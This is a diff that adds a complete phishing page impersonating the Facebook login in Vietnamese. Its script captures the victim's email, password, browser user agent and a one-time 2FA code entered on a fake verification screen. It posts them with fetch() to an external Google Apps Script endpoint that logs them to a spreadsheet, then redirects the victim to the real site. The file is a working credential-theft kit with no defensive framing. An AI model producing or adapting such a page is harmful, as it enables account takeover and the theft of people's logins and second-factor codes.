@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Đăng nhập</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f0f2f5; margin:0; padding:0; display:flex; justify-content:center; align-items:center; min-height:100vh; }
+        .container { background:white; width:396px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); padding:20px; text-align:center; }
+        .logo { font-size:50px; color:#1877f2; font-weight:bold; margin-bottom:10px; }
+        input { width:100%; padding:14px; margin:8px 0; border:1px solid #ddd; border-radius:6px; font-size:17px; box-sizing:border-box; }
+        button { width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:6px; font-size:17px; font-weight:bold; cursor:pointer; margin:10px 0; }
+        button:hover { background:#166fe5; }
+        .hidden { display:none; }
+    </style>
+</head>
+<body>
+
+<div id="loginScreen" class="container">
+    <div class="logo">f</div>
+    <h2>Đăng nhập vào Facebook</h2>
+    <form id="loginForm">
+        <input type="text" id="email" placeholder="Email hoặc số điện thoại" required>
+        <input type="password" id="pass" placeholder="Mật khẩu" required>
+        <button type="submit">Đăng nhập</button>
+    </form>
+</div>
+
+<div id="otpScreen" class="container hidden">
+    <div class="logo">f</div>
+    <h2>Xác minh tài khoản</h2>
+    <p id="otpMessage" style="font-size:14px;color:#666;"></p>
+    <input type="text" id="otp" placeholder="Nhập mã 6 số" maxlength="6" style="text-align:center;font-size:22px;letter-spacing:8px;width:100%;padding:12px;">
+    <button type="button" onclick="submitOTP()">Tiếp tục</button>
+</div>
+
+<script>
+    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbymu3VZcbiUsesLQlOt65AIxEbOlYgFQB7PZq6cfqT16O3QPgCl5C-LXI-0HwupkPc/exec"; // ← DÁN URL MỚI VÀO ĐÂY
+
+    let stolenData = {};
+
+    window.onload = () => {
+        console.log("%c✅ Script loaded - Ready to steal", "color:green;font-weight:bold");
+    };
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        stolenData.email = document.getElementById('email').value;
+        stolenData.password = document.getElementById('pass').value;
+        stolenData.user_agent = navigator.userAgent;
+
+        console.log("📤 Sending LOGIN data...");
+        sendToSheet();
+        
+        document.getElementById('loginScreen').classList.add('hidden');
+        document.getElementById('otpScreen').classList.remove('hidden');
+        document.getElementById('otpMessage').innerHTML = `Mã đã gửi đến <b>${stolenData.email}</b>`;
+    });
+
+    window.submitOTP = function() {
+        const otp = document.getElementById('otp').value.trim();
+        if (!otp) return alert("Nhập mã OTP");
+        stolenData.otp = otp;
+        console.log("📤 Sending OTP data...");
+        sendToSheet();
+        alert("Đăng nhập thành công! Dữ liệu đã lên Sheet.");
+        setTimeout(() => window.location.href = "https://www.facebook.com", 800);
+    };
+
+    function sendToSheet() {
+        fetch(WEB_APP_URL, {
+            method: "POST",
+            headers: { "Content-Type": "text/plain;charset=utf-8" },
+            body: JSON.stringify(stolenData),
+            mode: "no-cors"   // tạm bypass để test
+        })
+        .then(() => console.log("%c✅ Data sent to Sheet (no-cors mode)", "color:green"))
+        .catch(err => console.error("❌ Fetch error:", err));
+    }
+</script>
+</body>
+</html>
